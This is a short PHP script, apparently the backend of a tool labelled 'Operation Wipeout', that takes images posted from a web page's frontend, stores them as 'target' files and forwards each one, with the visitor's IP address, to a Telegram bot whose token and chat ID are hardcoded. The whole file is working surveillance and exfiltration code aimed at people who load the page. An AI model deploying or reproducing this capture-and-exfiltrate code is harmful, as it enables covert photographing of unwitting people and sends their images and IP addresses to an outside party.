<?php
// --- OPERATION WIPEOUT: TELEGRAM INTEGRATED CAPTURE ---

// 1. CONFIGURATION
$botToken = "8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg";
$chatId = "1020906452";
$saveFolder = 'targets/';

// Create folder if it doesn't exist
if (!file_exists($saveFolder)) {
    mkdir($saveFolder, 0777, true);
}

// 2. GET IMAGE DATA FROM FRONTEND
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['image'])) {
    $img = $data['image'];
    $img = str_replace('data:image/png;base64,', '', $img);
    $img = str_replace(' ', '+', $img);
    $fileData = base64_decode($img);

    // Save locally for backup
    $fileName = $saveFolder . 'target_' . date('Ymd_His') . '.png';
    file_put_contents($fileName, $fileData);

    // 3. SEND TO TELEGRAM BOT
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    
    // We use cURL to send the saved file to Telegram
    $post_fields = [
        'chat_id' => $chatId,
        'photo'   => new CURLFile(realpath($fileName)),
        'caption' => "📸 [WIPEOUT CAPTURE]\nTime: " . date('H:i:s') . "\nTarget IP: " . $_SERVER['REMOTE_ADDR']
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    $result = curl_exec($ch);
    curl_close($ch);

    echo "✅ Capture Sent to Command Center.";
}
?>